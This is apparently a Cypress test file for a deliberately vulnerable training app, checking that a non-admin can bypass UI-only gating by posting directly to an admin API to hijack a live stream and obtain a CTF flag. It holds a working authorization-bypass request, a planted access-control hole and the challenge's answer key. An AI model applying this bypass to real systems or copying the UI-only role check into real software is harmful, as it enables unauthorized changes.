const FLAG = "OSS{brok3n_funct10n_l3v3l_4uth0r1z4t10n}";
const RICKROLL_VIDEO_ID = "dQw4w9WgXcQ";

describe("Broken Function Level Authorization (live stream hijack)", () => {
  beforeEach(() => {
    // Reset the stream config back to the official broadcast.
    cy.task("seedDatabase");
  });

  it("shows the Update stream button to an admin", () => {
    cy.loginAsAdmin();
    cy.visit("/admin/live");

    cy.contains("Stream Management").should("be.visible");
    cy.contains("button", "Update stream").should("be.visible");
  });

  it("hides the Update stream button from a non-admin (cosmetic gating)", () => {
    cy.loginAsAlice();
    cy.visit("/admin/live");

    cy.contains("Only administrators can update the broadcast.").should(
      "be.visible"
    );
    cy.contains("button", "Update stream").should("not.exist");
  });

  it("lets a non-admin hijack the broadcast via the API and surfaces the flag on /live", () => {
    cy.loginAsAlice();

    // The button is hidden in the UI, but the API never checks the role.
    cy.request({
      method: "POST",
      url: "/api/live/stream",
      body: { liveVideoId: RICKROLL_VIDEO_ID },
    }).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body.flag).to.eq(FLAG);
    });

    // The public page now plays the attacker's video and shows the flag.
    cy.visit("/live");
    cy.contains("Broadcast Hijacked!").should("be.visible");
    cy.contains(FLAG).should("be.visible");
    cy.get(`iframe[src*="${RICKROLL_VIDEO_ID}"]`).should("exist");
  });
});
